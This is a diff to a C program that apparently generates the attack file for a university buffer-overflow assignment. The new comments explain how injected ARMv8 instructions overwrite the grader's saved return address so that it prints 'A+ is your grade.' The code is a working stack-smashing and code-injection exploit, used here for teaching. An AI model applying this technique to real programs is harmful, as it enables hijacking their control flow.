@@ -3,13 +3,36 @@
 /* Author: Tom Wang and Ty Lipscomb                                   */
 /*--------------------------------------------------------------------*/
 
-/* Produces a file called dataA with the student name, padding to
-   align to 4 bytes, four ARMv8 machine-language instructions
-   (adr, mov, strb, b) that store 'A' into the grade variable and
-   then branch to main's "is your grade" printf, more padding to
-   overrun the stack, and the address of the first injected
-   instruction, which will overwrite getName's saved x30 so that
-   getName returns into the injected code in the name array. */
+/* Produces a file called dataAplus that overruns the grader's
+   buffer to make it print "A+ is your grade.". The file contains:
+   the student name terminated by a null byte, padding to align to
+   4 bytes, six ARMv8 machine-language instructions (adr, bl, adr,
+   mov, strb, b) followed by the literal byte 'A' and a null byte,
+   padding to fill out the 48-byte buf, and an 8-byte little-endian
+   address that overwrites getName's saved x30.
+
+   Principle of operation: the first 48 bytes of input are copied
+   from buf into the bss-section name[] array; the next 8 bytes
+   overrun buf and overwrite getName's saved x30. When getName
+   returns, control jumps into the injected instructions sitting
+   inside name[]. Those instructions:
+     1. adr x0, <addr of "A">  -- point x0 at the literal "A\0"
+        embedded in name[].
+     2. bl printf              -- call printf("A"), printing "A"
+        without a trailing newline. bl sets x30 to the next
+        injected instruction so printf returns back into our code.
+     3. adr x0, <addr of grade> -- load address of grade variable.
+     4. mov w1, #0x2B          -- '+' character.
+     5. strb w1, [x0]          -- write '+' into grade.
+     6. b main+64              -- jump to the existing
+        printf("%c is your grade.\n", grade) instruction in main,
+        which prints "+ is your grade.". Combined with the earlier
+        "A", the user sees "A+ is your grade." followed by
+        "Thank you, <name>." from main's last printf, all of which
+        is indistinguishable from normal grader output.
+
+   None of the bytes written is 0x0a, so fgetc never sees a
+   premature newline. */
 
 #include <stdio.h>
 #include "miniassembler.h"
@@ -60,8 +83,10 @@ printf("%c is your grade.\n", grade);
     putc('\0', psFile);
     putc('\0', psFile);
 
-   /* bytes 4-7 adr x0, 0x420074
-   in this iteration loads the A string into x0 (A is stored 24 lines after this)*/
+   /* bytes 4-7: adr x0, 0x420074. Loads the address of the literal
+   "A\0" string (which we embed at name[28], 24 bytes after this
+   instruction) into x0 so it can serve as printf's format string.
+   This is the 1st injected instruction, 4 bytes after name. */
    uiInstr = MiniAssembler_adr(0, a_string_addr, name_addr + 4);
    fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);
 
@@ -72,34 +97,44 @@ printf("%c is your grade.\n", grade);
    uiInstr = MiniAssembler_bl(printf_addr, name_addr + 8);
    fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);
 
-   /* bytes 12-15 executing adr x0, 0x420044 moving grade address to x0 
-   stores the instruction 4 bytes after name accordingly*/
+   /* bytes 12-15: adr x0, 0x420044. Loads the address of grade
+   into x0 in preparation for writing '+' to it. 3rd injected
+   instruction, 12 bytes after name. */
    uiInstr = MiniAssembler_adr(0, grade_addr, name_addr + 12);
    fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);
 
-   /* bytes 16-19 executes mov w1, #0x2B which jsut stores the value for '+' into w1*/
+   /* bytes 16-19: mov w1, #0x2B. Stores the ASCII value of '+'
+   into w1. 4th injected instruction. */
    uiInstr = MiniAssembler_mov(1, 0x2B);
    fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);
 
-   /* Bytes 20-23 executes
-   strb w1, [x0] whic store the byte '+' at the address of grade */
+   /* Bytes 20-23: strb w1, [x0]. Stores the byte '+' at the
+   address of grade, so grade is now '+'. 5th injected
+   instruction. */
    uiInstr = MiniAssembler_strb(1, 0);
    fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);
 
-   /* bytes 24-27 executes b 0x40089c which is the jump to the location of printf
-   so that the grade prints "+ is your grade." since we already printed A, this should work great
-   stores the insturction 16 bytes after name since this is the 4th instruction
-   */
+   /* bytes 24-27: b 0x40089c. Branches to main+64, which is the
+   start of the existing printf("%c is your grade.\n", grade)
+   block. Since "A" was already printed (no newline), the user
+   sees "A+ is your grade." on one line. 6th injected
+   instruction, 24 bytes after name. */
    uiInstr = MiniAssembler_b(is_grade_addr, name_addr + 24);
    fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);
 
-   /* Bytes 28-29 this stores the actual A string plus the empty string stored after the instruction calls*/
+   /* Bytes 28-29: the literal byte 'A' followed by '\0', which
+   serves as the format string passed to printf in the bl call
+   above. */
    putc('A', psFile);
    putc('\0', psFile);
    
-   /* 18 null bytes. This acts as padding since the first 30 store the name, null byte, print A
-   and the 24 inctruction bytes involved with that. the rest is stored in name but too long for printf
-   18 +30 = 48 buffer boom*/
+   /* 18 null bytes of padding. The first 30 bytes hold the name
+   (4 bytes), the 6 injected instructions (24 bytes), and the
+   "A\0" literal (2 bytes); these 18 zero bytes pad buf out to its
+   full 48-byte length. The bytes from position 20 onward are also
+   copied into name[20..47] but never reach the "Thank you" printf
+   because the name string is already terminated by the \0 at
+   name[2]. 30 + 18 = 48. */
    for (i = 0; i < 18; i++) {
       putc(0x00, psFile);
    }
